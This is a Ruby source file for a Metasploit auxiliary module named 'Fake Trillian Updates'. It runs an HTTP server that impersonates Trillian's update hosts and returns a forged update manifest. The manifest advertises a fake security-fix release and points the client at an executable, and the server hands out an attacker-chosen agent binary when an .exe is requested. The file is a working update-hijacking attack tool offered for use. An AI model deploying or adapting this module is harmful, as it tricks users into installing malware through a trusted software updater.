require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	
	def initialize
		super(
			'Name'        => 'Fake Trillian Updates',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Trillian updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base = {
			'vh' => ['www.ceruleanstudios.com' , 'cerulean.cachenetworks.com' ] ,
			'request' => [{
		    		'req' => '^/cgi-bin/autosync/autosync', 
		    		'type' => 'file', 
				'method' => '', 
				'bin'    => '',
		    		'string' => '',
		    		'parse' => 1,
		    		'file' => 'trillian'
		    		},
		    		{
		    		'req' => '.exe',
	    			'type' => 'agent',
	    			'bin'    => 1,
	    			'method' => '', 
	    			'string' => '',
	    			'parse' => '',
	    			'file' => ''
				}
			],
			'options' => {	
				'title'  => { 
					'val' => 'foo="Trillian 3.1" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
			    		'desc' => 'Title name display in the update' ,
					'dynamic' => 1 
				},
		    		'description' => {
					'val' => 'foo="Trillian 3.1.12.0 - Fixes for recent security vulnerabilities and a minor MSN bugfix." ;  bar=[foo.length] ;  bar.pack("c") + "#{foo}" ',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
		 		'serial' => {
					'val' => 'foo="{141D3E02-FB6C-4bee-8DB1-84CB04822B8C}" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'v1' => {
					'val' => 'foo="3" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'v2' => {
					'val' => 'foo="1" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'v3' => {
					'val' => 'foo="12" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'v4' => {
					'val' => 'foo="3" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},

				'location' => {
					'val' => 'foo="http://cerulean.cachenetworks.com/updates/coreupdate-31120.exe" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'd1' => {
					'val' => 'foo="4846706b207f8dd05ff403d0806a2148e27df97a" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'd2' => {
					'val' => 'foo="0" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'd3' => {
					'val' => 'foo="1106757732" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'd4' => {
					'val' => 'foo="Cerulean Studios" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'ip' => {
					'val' => 'foo="74.201.34.19" ; bar=[foo.length] ;  bar.pack("c") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
				'png' => {
					'val' => 'foo= File.read( File.join(Msf::Config.install_root, "data", "exploits", "update", "http", "test.png")   ) ;  l1 = foo.length / 256; l2 =foo.length % 256;  bar=[l1,l2] ;   bar.pack("c2") + "#{foo}"',
					'desc' => 'Description display in the update',
					'dynamic' => 1
			       	},
			}
		}
	end
end
